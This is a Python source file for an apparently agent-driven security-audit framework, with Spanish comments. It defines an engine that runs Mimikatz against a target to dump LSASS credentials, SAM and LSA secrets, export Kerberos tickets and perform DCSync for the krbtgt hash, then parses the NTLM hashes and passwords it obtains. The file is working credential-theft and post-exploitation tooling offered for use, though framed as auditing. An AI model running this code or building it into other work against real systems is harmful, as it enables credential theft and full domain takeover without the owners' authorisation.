from __future__ import annotations

import subprocess
import tempfile
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


class MimikatzEngine(BaseEngine):
    name = "mimikatz"
    description = "Mimikatz para dumpeo de credenciales en memoria (LSASS). Requiere ejecucion en Windows o wine64 con privilegios de administrador."
    capabilities = ["ad_audit", "credential_dump", "post_exploitation", "active_directory", "privilege_escalation"]

    MIMIKATZ_COMMANDS = """
    privilege::debug
    sekurlsa::logonpasswords
    sekurlsa::ekeys
    lsadump::sam
    lsadump::secrets
    token::elevate
    lsadump::dcsync /domain:{domain} /user:{user}
    vault::list
    kerberos::list /export
    """

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        domain = kwargs.get("domain", target)
        username = kwargs.get("username", "")
        binary_path = kwargs.get("binary_path", "mimikatz")
        timeout = int(kwargs.get("timeout", 60))
        commands = kwargs.get("commands", ["privilege::debug", "sekurlsa::logonpasswords"])
        target_user = kwargs.get("target_user", "krbtgt")

        raw_lines.append(f"[INFO] Mimikatz ejecutando en {target} (dominio: {domain})")
        raw_lines.append(f"[INFO] Comandos: {commands}")

        # Strategy: write commands to a temp file and run mimikatz with it
        if not commands:
            commands = ["privilege::debug", "sekurlsa::logonpasswords"]

        # Replace placeholders
        resolved_commands = []
        for cmd in commands:
            cmd = cmd.replace("{domain}", domain)
            cmd = cmd.replace("{user}", target_user)
            resolved_commands.append(cmd)

        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                script_path = f.name
                f.write("\n".join(resolved_commands) + "\n")
                f.write("exit\n")

            result = subprocess.run(
                [binary_path, script_path],
                capture_output=True, text=True, timeout=timeout,
            )
            stdout = result.stdout
            stderr = result.stderr

            if not stdout and not stderr:
                raw_lines.append("[WARN] Mimikatz: sin output (probablemente no es Windows o wine64)")
                findings.append({
                    "file_path": target,
                    "line_start": 0, "line_end": 0,
                    "severity": "info",
                    "title": "Mimikatz no ejecutable en este SO",
                    "description": f"Mimikatz requiere Windows o wine64. No se obtuvo output en {target}.",
                    "tool": self.name,
                    "rule_id": "mimikatz-not-windows",
                })
            else:
                raw_lines.append(f"[INFO] Mimikatz output: {len(stdout)} chars")
                raw_lines.append(f"  Output sample: {stdout[:1000]}")

                # Parse for credentials
                lines = stdout.split("\n")
                creds_found = False
                hash_count = 0
                password_count = 0

                for line in lines:
                    line_lower = line.lower()

                    if "msv" in line_lower and "username" in line_lower:
                        creds_found = True
                    if "ntlm" in line_lower and ":" in line:
                        hash_count += 1
                    if "password" in line_lower and ":" in line and not "mimikatz" in line_lower:
                        pwd_val = line.split(":", 1)[1].strip()
                        if pwd_val and pwd_val not in ("(null)", ""):
                            password_count += 1

                    # Find NTLM hashes
                    if "ntlm" in line_lower:
                        parts = line.split(":")
                        if len(parts) >= 2 and len(parts[1].strip()) == 32:
                            username_part = line_lower.split("username")[-1] if "username" in line_lower else ""
                            user = username_part.split(":")[-1].strip() if username_part else "unknown"
                            findings.append({
                                "file_path": target,
                                "line_start": 0, "line_end": 0,
                                "severity": "critical",
                                "title": f"NTLM hash dumpeado: {user}",
                                "description": f"Hash NTLM extraido via Mimikatz sekurlsa::logonpasswords en {target}",
                                "tool": self.name,
                                "rule_id": f"mimikatz-ntlm-{user.lower()}",
                                "username": user,
                            })

                if creds_found or hash_count or password_count:
                    raw_lines.append(f"[CRITICAL] Mimikatz: {hash_count} hashes, {password_count} passwords encontrados")

                # DCSync finding
                dcsync_match = [l for l in lines if "krbtgt" in l.lower() and ("ntlm" in l.lower() or "hash" in l.lower())]
                if dcsync_match and "krbtgt" in str(commands).lower():
                    raw_lines.append("[CRITICAL] DCSync ejecutado — hash de krbtgt obtenido!")
                    findings.append({
                        "file_path": target,
                        "line_start": 0, "line_end": 0,
                        "severity": "critical",
                        "title": "DCSync: hash de krbtgt comprometido",
                        "description": f"Se ejecuto DCSync contra {domain} y se obtuvo el hash de krbtgt — posible Golden Ticket",
                        "tool": self.name,
                        "rule_id": "mimikatz-dcsync",
                        "domain": domain,
                    })

        except FileNotFoundError:
            raw_lines.append(f"[WARN] Mimikatz no encontrado en: {binary_path}")
            findings.append({
                "file_path": target,
                "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": "Mimikatz no instalado",
                "description": f"Mimikatz no se encuentra en {binary_path}. Descargar de https://github.com/gentilkiwi/mimikatz",
                "tool": self.name,
                "rule_id": "mimikatz-not-found",
            })
        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] Mimikatz timed out")
        except Exception as e:
            raw_lines.append(f"[ERR] Mimikatz: {e}")
        finally:
            import os as _os
            try:
                _os.unlink(script_path)
            except Exception:
                pass

        summary = f"mimikatz: {len(findings)} hallazgos"
        return EngineResult(
            success=True,
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
